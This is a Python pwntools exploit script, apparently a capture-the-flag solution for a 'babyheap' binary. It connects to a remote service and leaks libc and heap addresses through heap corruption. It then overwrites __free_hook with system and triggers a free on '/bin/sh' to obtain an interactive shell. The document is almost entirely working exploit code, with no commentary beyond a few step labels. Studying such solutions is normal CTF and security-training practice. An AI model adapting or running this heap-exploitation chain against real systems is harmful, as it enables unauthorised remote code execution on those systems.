#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('babyheap'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

def create(desc, l = 0):
    global level
    assert level == 1
    r.sendlineafter('>', '1')
    r.sendlineafter('length :', str(l) if l != 0 else str(len(desc)))
    r.sendlineafter(' :', desc)

def delete(idx):
    global level
    assert level == 1
    r.sendlineafter('>', '2')
    r.sendlineafter('Index :', str(idx))

def manager(idx):
    global level
    assert level == 1
    r.sendlineafter('>', '3')
    r.sendlineafter('Index :', str(idx))
    level = 2

def add_member(num, name = '', desc = '', loop = -1):
    global level
    assert level == 2
    r.sendlineafter('>', '1')
    r.sendlineafter(' :', str(num))
    for i in range(num if loop == -1 else loop):
        r.sendlineafter(' :', name)
        r.sendlineafter(' :', desc)

def delete_member(idx):
    global level
    assert level == 2
    r.sendlineafter('>', '2')
    r.sendlineafter('Index :', str(idx))

def list_member(idx):
    global level
    assert level == 2
    r.sendlineafter('>', '3')

def manager_member(idx, desc):
    global level
    assert level == 2
    r.sendlineafter('>', '4')
    r.sendlineafter('Index :', str(idx))
    r.recvuntil(' :')
    r.send(desc, 0x64)

def ret_member():
    global level
    assert level == 2
    r.sendlineafter('>', '5')
    level = 1


level = 1
r = remote(HOST, PORT)

# leak libc
create(flat(0, 0x21))
manager(0)
add_member(2)
delete_member(0)
ret_member()
create('', 0xc0)
r.sendlineafter('>', '4')
r.recvuntil('Team 1')
libc_base = (r.leak('Description : \n', 'Size :') << 8)  - 0x3c4b00
libc.address += libc_base
log.info('libc_base: {}'.format(hex(libc_base)))

# leak heap
for i in range(0x10):
    create('fastbin')
for i in range(2, 0x10-1):
    delete(i)
manager(0)
add_member(254, loop = 0)
manager_member(0, 'a'*0x11)
list_member(0)
leak = r.leak('Description : ' + 'a'*0x10) & 0xffffffffffff
heap_base = leak - 0x561
log.info('heap_base: {}'.format(hex(heap_base)))

# g_teams[0].members[0] -> __free_hook -> system
manager_member(0, flat(0, 0x21, heap_base + 0x200))
ret_member()
create(p64(libc.sym['__free_hook']))
pause()
manager(0)
manager_member(0, flat(libc.sym['system']))
#list_member(0)

# shell out
ret_member()
manager(1)
add_member(1, desc='/bin/sh\x00')
delete_member(0)

r.interactive()
